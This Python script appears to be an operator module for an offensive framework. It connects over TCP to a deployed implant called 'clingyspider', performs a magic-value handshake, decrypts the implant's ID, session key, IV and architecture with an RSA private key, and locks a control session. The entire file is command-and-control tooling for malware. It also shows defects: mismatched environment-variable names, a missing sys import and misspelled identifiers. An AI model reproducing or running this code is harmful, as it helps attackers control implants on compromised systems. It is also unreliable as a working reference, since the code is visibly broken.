import eternalhush as eh
from additional import clingyspider
import os

def main(args):
    if(eh.ui.GetEnv("CLINGYSPIDER_CONNECTION") != ""):
        eh.ui.Echo("The session is already set up", eh.ECHO_ERROR)
        return
    tcp_connection = eh.net.NewConnection(args[0], int(args[1]), eh.TCP_CONNECTION)
    if tcp_connection == None:
        eh.ui.Echo("Failed to open direct TCP connection to " + args[0] + ":" + args[1], eh.ECHO_ERROR)
        return
    eh.ui.Echo("Opened direct TCP connection to " + args[0] + ":" + args[1], eh.ECHO_DEFAULT)
    eh.net.AddHandler(tcp_connection, "handlers.clsp_msg_handler", "ProcessMessage")
    
    hello_request = eh.data.Struct(clingyspider.HELLO_REQUEST)
    
    eh.ui.Echo("STAGE 1 - Negotiation", eh.ECHO_WARNING)
    hello_request.val1 = clingyspider.MAGIC_VAL1
    hello_request.val2 = clingyspider.MAGIC_VAL2
    hello_request.inital_data = bytearray(os.urandom(248))

    eh.net.TcpSend(tcp_connection, hello_request.data())
    eh.ui.Echo("Sended Hello request", eh.ECHO_DEFAULT)
    
    hello_response = eh.data.Struct(clingyspider.HELLO_RESPONSE)
    resp = eh.net.TcpRecv(tcp_connection, len(hello_response))

    if not resp:
        eh.ui.Echo("Invalid data received", eh.ECHO_ERROR)
        return
    eh.ui.Echo("Received Hello response", eh.ECHO_DEFAULT)
    hello_response.from_bytes(resp)
    
    eh.ui.Echo("Decrypting implant info with privatekey", eh.ECHO_DEFAULT)
    key = eh.crypto.ImportRsaKey(args[2], eh.PRIVATE_KEY)
    if not key:
        eh.ui.Echo("Invalid RSA private key specified", eh.ECHO_ERROR)
        return
    decrypted_implant_info = eh.crypto.DecryptRsaData(key, hello_response.implant_info.get())

    implant_info = eh.data.Struct(clingyspider.IMPANT_INFO)
    implant_info.from_bytes(decrypted_implant_info)
    
    eh.ui.Echo("Implant version: " + implant_info.implant_version.get()[::-1].hex(), eh.ECHO_DEFAULT)
    eh.ui.SetEnv("CLSP_VERSION", implant_info.implant_version.get()[::-1].hex())

    eh.ui.Echo("Implant id: " +  str(int.from_bytes(implant_info.implant_id.get(), "little")), eh.ECHO_DEFAULT)
    eh.ui.SetEnv("CLSP_ID", str(int.from_bytes(implant_info.implant_id.get(), "little")))
  
    eh.ui.Echo("Implant session key: " + implant_info.session_key.get().hex(), eh.ECHO_DEFAULT)
    eh.ui.SetEnv("CLSP_KEY", implant_info.session_key.get().hex())

    eh.ui.Echo("IV key: " + hello_response.next_iv.get().hex(), eh.ECHO_DEFAULT)
    eh.ui.SetEnv("CLSP_IV", hello_response.next_iv.get().hex())

    if(int.from_bytes(implant_info.implant_arch.get(), "little") == clingyspider.X64_ARCH):
        eh.ui.Echo("Implant architecture: X64", eh.ECHO_DEFAULT)
        eh.ui.SetEnv("CLSP_ARCH", "x64")
    else:
        eh.ui.Echo("Implant architecture: X86", eh.ECHO_DEFAULT)
        eh.ui.SetEnv("CLSP_ARCH", "x86")
        
    if(int.from_bytes(implant_info.platform_arch.get(), "little") == clingyspider.X64_ARCH):
        eh.ui.Echo("Platform architecture: X64", eh.ECHO_DEFAULT)
        eh.ui.SetEnv("PLATFORM_ARCH", "x64")
    else:
        eh.ui.Echo("Platform architecture: X86", eh.ECHO_DEFAULT)
        eh.ui.SetEnv("PLATFORM_ARCH", "x86")
    eh.ui.Echo("Implant platform: " + implant_info.implant_platform.get().hex(), eh.ECHO_DEFAULT)
    
    eh.ui.SetHostname(args[0])
    eh.net.LockSession("clsp")
    eh.ui.SetEnv("CLSP_CONNECTION", tcp_connection)

if __name__=="__main__":
    main(sys.argv)